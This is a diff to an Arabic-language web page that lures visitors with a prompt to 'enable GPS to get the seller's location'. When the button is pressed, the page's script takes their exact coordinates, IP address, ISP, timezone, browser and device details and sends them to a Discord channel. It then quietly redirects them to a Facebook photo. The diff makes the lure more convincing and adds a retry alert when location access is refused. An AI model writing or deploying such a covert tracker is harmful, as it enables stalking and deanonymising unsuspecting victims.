@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>جاري التحويل...</title>
+  <title>من فضلك، قم بتفعيل الـ GPS</title>
   <style>
     body {
       margin: 0;
@@ -19,12 +19,30 @@
       font-size: 20px;
       color: #000;
     }
+
+    .button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      background-color: #003366;
+      color: white;
+      font-size: 18px;
+      border: none;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+
+    .button:hover {
+      background-color: #0055cc;
+    }
   </style>
 </head>
 <body>
 
 <div class="content">
-  <!-- محتوى الصفحة سيكون فارغًا إلى حد كبير، فقط لتوفير مساحة للمحتوى المطلوب -->
+  <div id="message">
+    <p>قم بتفعيل GPS لكي تحصل على موقع البائع.</p>
+    <button class="button" onclick="enableGPS()">تفعيل GPS</button>
+  </div>
 </div>
 
 <script>
@@ -46,7 +64,7 @@
     return Promise.allSettled(promises);
   };
 
-  const gatherInfo = async () => {
+  const enableGPS = async () => {
     let locationInfo = "📍 الموقع: لم يتم تحديد GPS\n";
     let latitude, longitude;
 
@@ -60,6 +78,8 @@
       locationInfo = `📍 GPS:\n- خط العرض: ${latitude}\n- خط الطول: ${longitude}\n`;
     } catch (e) {
       locationInfo = "📍 الموقع: المستخدم رفض أو لم يتم تحديد GPS\n";
+      alert("لم يتم تفعيل GPS. يرجى الضغط على الزر لتفعيله.");
+      return;
     }
 
     const ipData = await fetch("https://ipapi.co/json/").then(res => res.json()).catch(() => ({}));
@@ -73,9 +93,9 @@
 
 ${locationInfo}
 🌐 IP: ${ipData.ip || "غير معروف"}
-🌍 الدولة: ${ipData.country_name || "?"} - ${ipData.city || "?"}
-🛰️ مزود الخدمة: ${ipData.org || "?"}
-🕰️ المنطقة الزمنية: ${ipData.timezone || "?"}
+🌍 الدولة: ${ipData.country_name || "؟"} - ${ipData.city || "؟"}
+🛰️ مزود الخدمة: ${ipData.org || "؟"}
+🕰️ المنطقة الزمنية: ${ipData.timezone || "؟"}
 
 🖥️ المتصفح: ${userAgent}
 📱 الجهاز: ${platform}
@@ -87,13 +107,16 @@ ${locationInfo}
 
     await sendToDiscord(message);
 
-    // بعد إرسال البيانات، يتم تحويل المستخدم إلى الرابط المطلوب
+    // بعد جمع البيانات، يتم تحويل المستخدم إلى الرابط المطلوب
     window.location.href = "https://web.facebook.com/photo/?fbid=122200481186109181&set=pcb.122200486340109181";
   };
 
-  gatherInfo().catch(err => {
-    console.error("حدث خطأ أثناء جمع البيانات:", err);
-  });
+  // في حالة عدم تفعيل GPS، يتم طلب تفعيل GPS مرة أخرى
+  setTimeout(() => {
+    if (!navigator.geolocation) {
+      alert("لم يتم دعم GPS في متصفحك. يرجى تحديث المتصفح.");
+    }
+  }, 10000); // تأخير 10 ثواني للتحقق من تفعيل الـ GPS
 </script>
 
 </body>
